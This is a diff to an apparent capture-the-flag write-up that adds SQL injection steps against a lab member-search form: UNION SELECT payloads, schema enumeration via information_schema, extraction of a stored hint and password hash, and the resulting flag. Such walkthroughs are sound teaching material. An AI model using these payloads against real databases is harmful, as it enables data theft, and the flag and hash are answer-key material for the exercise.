@@ -43,6 +43,11 @@ SELECT first_name, last_name FROM Users WHERE ID = 105 OR 1=1
 ```
 
 ```
+1 union select null, first_name, last_name from members
+->
+Table 'Member_Sql_Injection.members' doesn't exist
+```
+```
 1 UNION SELECT * FROM users --
 ->
 The used SELECT statements have a different number of columns
@@ -72,8 +77,20 @@ Surname : GetThe
 ->
 Unknown column 'password' in 'field list'
 ```
-
-But I don't know what to do with it.
+```
+ID: 1 union select schema_name, null from information_schema.schemata -- 
+First name: Member_Sql_Injection
+Surname : 
+```
+```
+ID: 1 UNION SELECT commentaire, countersign FROM users  
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 5ff9d0165b4f92b14994e5c685cdce28
+```
+```
+encode fortytwo with sh256 
+FLAG: 3b4e8a30ecbfde518f50f2bda1912b40338ecd71821faeb1e9cdf44cefff95f5
+```
 
 ### 03 SQL injection from image search
 Same as 02, we put `1 OR 1=1` and we got this.
